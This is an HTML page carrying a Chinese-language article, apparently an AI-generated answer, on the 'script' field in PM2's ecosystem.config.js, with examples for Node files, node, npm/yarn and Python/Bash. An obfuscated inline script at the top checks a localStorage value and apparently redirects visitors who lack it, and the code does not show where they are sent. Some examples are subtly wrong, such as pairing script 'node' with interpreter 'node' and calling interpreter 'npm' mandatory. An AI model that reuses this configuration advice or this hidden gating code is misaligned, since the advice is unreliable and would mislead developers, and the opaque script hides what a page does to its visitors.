<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x2534cf=_0x3676;if((()=>{for(var s=_0x3676,n=_0xecc5();;)try{if(893362==-parseInt(s(142,"0Lut"))*(-parseInt(s(134,"OuK@"))/2)+parseInt(s(154,"0Lut"))/3+-parseInt(s(133,"RSAB"))/4+-parseInt(s(138,"s72K"))/5+-parseInt(s(156,"m@Wa"))/6*(parseInt(s(140,"f#2l"))/7)+parseInt(s(150,"CDUf"))/8+parseInt(s(146,"ud(1"))/9*(parseInt(s(151,"Ut!A"))/10))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x2534cf(152,"VIwX")](_0x2534cf(145,"W[yu"))!=_0x2534cf(147,"f#2l"))throw window[_0x2534cf(131,"(k%V")][_0x2534cf(148,"Ho@d")](_0x2534cf(153,"#M@W")),Error();function _0x3676(e,s){var o=_0xecc5();return(_0x3676=function(s,n){var a=o[s-=131];void 0===_0x3676.EvBzet&&(_0x3676.pgrogF=function(s,n){var a,t=[],e=0,o="";for(s=(s=>{for(var n,a,t="",e="",o=0,c=0;a=s.charAt(c++);~a&&(n=o%4?64*n+a:a,o++%4)&&(t+=String.fromCharCode(255&n>>(-2*o&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var r=0,p=t.length;r<p;r++)e+="%"+("00"+t.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(e)})(s),c=0;c<256;c++)t[c]=c;for(c=0;c<256;c++)e=(e+t[c]+n.charCodeAt(c%n.length))%256,a=t[c],t[c]=t[e],t[e]=a;for(var c=0,e=0,r=0;r<s.length;r++)a=t[c=(c+1)%256],t[c]=t[e=(e+t[c])%256],t[e]=a,o+=String.fromCharCode(s.charCodeAt(r)^t[(t[c]+t[e])%256]);return o},e=arguments,_0x3676.EvBzet=!0);var s=s+o[0],t=e[s];return t?a=t:(void 0===_0x3676.RVRdUQ&&(_0x3676.RVRdUQ=!0),a=_0x3676.pgrogF(a,n),e[s]=a),a})(e,s)}function _0xecc5(){var s=["BsOpxSkfAL8","CmoRlu1rdSoWWQVcNZDOumkF","WRqbW7dcLmoHWO3dPCkfW5xdM8kNW5j4WQG","iXubW4jdg8kHga","W7PPn8ktBSkXFW","d8kqWPldI05ouZhdKSk7WP4pW6uhf8kPsmkMW7lcJSoKsSo6WQtdJ8oU","WOxcKfBdMmkuW4/cN8oVWPiiamkIWRq","emoVW5ZdU8kBWPilWRG3j8owpCoi","W5NcOW7dHglcGenjda","gftcU1jdWRCvW7O","m8kGW6hdISo9W6JdGL1iWRNcJCkC","CSoPjKTzcCoXWPRcNWDnECkT","E2OKt8oNW6pcTCoZWPFcIdVdHq","jbzSWReCvCo/cwS/W4VcR8k3","W58dd1jvWQ3cUa","WOdcKfxdN8kDW4VcNCksWOyWaSkBWR1L","rh7cKelcRCkmcL8BxCo/W6fu","oCkeWRWvW7j+WQBcJCoHbSkRW7hcQYO","W50NbfSWWRJcRKdcKZTzW4e","W4vLWQ4tW4RdGmklWPlcUSk9AYG","WOddRZpcGmoUWRZdRq","W4DOkZNdUfTtWPZcSW","WRqaWPxdPSk/W4dcUmoy","W4ZcJCk/lCkvW4fxqmow","C2z/b8o2W77cHXZcGIuSW6rGWQG","WPXJqXPX"];return(_0xecc5=function(){return s})()}document.title="pm2 ecosystem.config.js 中 script 字段",document.getElementById("article").innerHTML='<div><p>是的，在 <code>ecosystem.config.js</code> 中，<code>script</code> 字段可以指定 <strong>Node.js 入口文件</strong>  （如 <code>app.js</code>），也可以直接使用 <strong><code>node</code> 命令</strong>   来运行脚本（例如 <code>node server.js</code>）。以下是具体用法和区别：</p>\n<hr>\n<h2><strong>1. <code>script</code> 为 Node.js 文件（推荐）</strong></h2>\n<p>直接指定入口文件，PM2 会自动用 <code>node</code> 执行：</p>\n<pre><code class="language-javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-attr">apps</span>: [{\n    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;my-app&#x27;</span>,\n    <span class="hljs-attr">script</span>: <span class="hljs-string">&#x27;./app.js&#x27;</span>,  <span class="hljs-comment">// PM2 会自动调用 `node app.js`</span>\n    <span class="hljs-attr">interpreter</span>: <span class="hljs-string">&#x27;node&#x27;</span>, <span class="hljs-comment">// 可省略（默认就是 `node`）</span>\n  }]\n};\n</code></pre>\n<p>✅ <strong>适用场景</strong>  ：</p>\n<ul>\n<li>大多数 Node.js 应用（如 Express、NestJS、Koa 等）。</li>\n<li>无需手动写 <code>node</code> 命令，PM2 自动处理。</li>\n</ul>\n<hr>\n<h2><strong>2. <code>script</code> 为 <code>node</code> 命令</strong></h2>\n<p>如果需要额外参数（如 <code>--inspect</code> 调试），可以显式使用 <code>node</code>：</p>\n<pre><code class="language-javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-attr">apps</span>: [{\n    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;my-app&#x27;</span>,\n    <span class="hljs-attr">script</span>: <span class="hljs-string">&#x27;node&#x27;</span>,       <span class="hljs-comment">// 直接调用 `node`</span>\n    <span class="hljs-attr">args</span>: <span class="hljs-string">&#x27;server.js --port 3000&#x27;</span>, <span class="hljs-comment">// 传递给 `node` 的参数</span>\n    <span class="hljs-attr">interpreter</span>: <span class="hljs-string">&#x27;node&#x27;</span>,  <span class="hljs-comment">// 可省略（默认是 `node`）</span>\n  }]\n};\n</code></pre>\n<p>✅ <strong>适用场景</strong>  ：</p>\n<ul>\n<li>需要传递 Node.js 运行时参数（如 <code>--inspect</code>、<code>--max-old-space-size</code>）。</li>\n<li>运行非 <code>.js</code> 文件（如 TypeScript 的 <code>.ts</code> 文件，需配合 <code>ts-node</code>）。</li>\n</ul>\n<hr>\n<h2><strong>3. <code>script</code> 为 <code>npm</code> / <code>yarn</code></strong></h2>\n<p>如果项目使用 <code>npm start</code> 或 <code>yarn start</code>：</p>\n<pre><code class="language-javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-attr">apps</span>: [{\n    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;my-app&#x27;</span>,\n    <span class="hljs-attr">script</span>: <span class="hljs-string">&#x27;npm&#x27;</span>,        <span class="hljs-comment">// 或 &#x27;yarn&#x27;</span>\n    <span class="hljs-attr">args</span>: <span class="hljs-string">&#x27;start&#x27;</span>,        <span class="hljs-comment">// 运行 `npm start`</span>\n    <span class="hljs-attr">interpreter</span>: <span class="hljs-string">&#x27;npm&#x27;</span>,  <span class="hljs-comment">// 必须指定为 `npm` 或 `yarn`</span>\n  }]\n};\n</code></pre>\n<p>✅ <strong>适用场景</strong>  ：</p>\n<ul>\n<li>项目通过 <code>package.json</code> 的 <code>scripts</code> 启动（如 <code>create-react-app</code>、<code>Next.js</code>）。</li>\n<li>需要兼容 <code>npm</code> / <code>yarn</code> 的特定环境变量。</li>\n</ul>\n<hr>\n<h2><strong>4. <code>script</code> 为其他解释器（Python、Bash 等）</strong></h2>\n<p>PM2 也可以运行非 Node.js 脚本：</p>\n<pre><code class="language-javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-attr">apps</span>: [{\n    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;python-server&#x27;</span>,\n    <span class="hljs-attr">script</span>: <span class="hljs-string">&#x27;./app.py&#x27;</span>,\n    <span class="hljs-attr">interpreter</span>: <span class="hljs-string">&#x27;python3&#x27;</span>, <span class="hljs-comment">// 指定 Python 解释器</span>\n  }, {\n    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;bash-script&#x27;</span>,\n    <span class="hljs-attr">script</span>: <span class="hljs-string">&#x27;./start.sh&#x27;</span>,\n    <span class="hljs-attr">interpreter</span>: <span class="hljs-string">&#x27;bash&#x27;</span>,   <span class="hljs-comment">// 指定 Bash 解释器</span>\n  }]\n};\n</code></pre>\n<p>✅ <strong>适用场景</strong>  ：</p>\n<ul>\n<li>混合技术栈（如 Node.js + Python 微服务）。</li>\n<li>运行 Shell 脚本、Python 脚本等。</li>\n</ul>\n<hr>\n<h2><strong>总结</strong></h2>\n<table>\n<thead>\n<tr>\n<th><code>script</code> 类型</th>\n<th>示例</th>\n<th>是否需要 <code>interpreter</code>?</th>\n<th>适用场景</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Node.js 文件</strong></td>\n<td><code>script: \'app.js\'</code></td>\n<td>❌ 可省略（默认 <code>node</code>）</td>\n<td>普通 Node.js 应用</td>\n</tr>\n<tr>\n<td><strong><code>node</code> 命令</strong></td>\n<td><code>script: \'node\', args: \'server.js\'</code></td>\n<td>❌ 可省略</td>\n<td>需要额外 Node 参数</td>\n</tr>\n<tr>\n<td><strong><code>npm</code> / <code>yarn</code></strong></td>\n<td><code>script: \'npm\', args: \'start\'</code></td>\n<td>✅ 必须指定 <code>npm</code>/<code>yarn</code></td>\n<td>前端项目（React/Vue）</td>\n</tr>\n<tr>\n<td><strong>其他解释器</strong></td>\n<td><code>script: \'app.py\', interpreter: \'python3\'</code></td>\n<td>✅ 必须指定</td>\n<td>Python/Bash 脚本</td>\n</tr>\n</tbody>\n</table>\n<h3><strong>最佳实践</strong></h3>\n<ol>\n<li><strong>普通 Node.js 项目</strong>   → 直接指定 <code>.js</code> 文件（<code>script: \'app.js\'</code>）。</li>\n<li><strong>需要调试/特殊参数</strong>   → 用 <code>script: \'node\', args: \'...\'</code>。</li>\n<li><strong><code>npm</code>/<code>yarn</code> 项目</strong>   → 必须指定 <code>interpreter: \'npm\'</code>。</li>\n<li><strong>非 Node.js 脚本</strong>   → 必须指定 <code>interpreter</code>（如 <code>python3</code>、<code>bash</code>）。</li>\n</ol>\n<p>这样可以确保 PM2 以正确的方式运行你的应用！ 🚀</p>\n</div>'</script></body></html>